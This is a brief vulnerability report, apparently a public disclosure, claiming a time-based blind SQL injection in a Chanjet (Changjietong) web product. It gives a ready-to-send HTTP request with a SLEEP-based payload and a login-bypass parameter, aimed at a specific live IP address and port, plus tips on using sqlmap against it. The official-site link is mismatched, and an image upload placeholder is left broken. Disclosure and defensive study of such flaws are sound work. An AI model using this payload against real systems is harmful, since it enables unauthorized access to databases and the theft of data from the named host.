Changjietong Information Technology Co., Ltd. has SQL injection, which attackers can exploit to obtain information.

official：[https://www.kehua.com.cn/](https://www.chanjet.com/)

version:1.0

 Vulnerability Path  ： /mail/mailinactive.php

See the login page.

poc：
```
GET /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-&DontCheckLogin=1 HTTP/1.1
Host: 49.4.122.252:8090
Connection: close
```

Ip：http://49.4.122.252:8090
SQL map confirms a vulnerability, which is quite special. It cannot run SQL map with cookies. Use my POC-R and do not use SQL map. Custom cookies should be marked with an * injection point
![Uploading image.png…]()
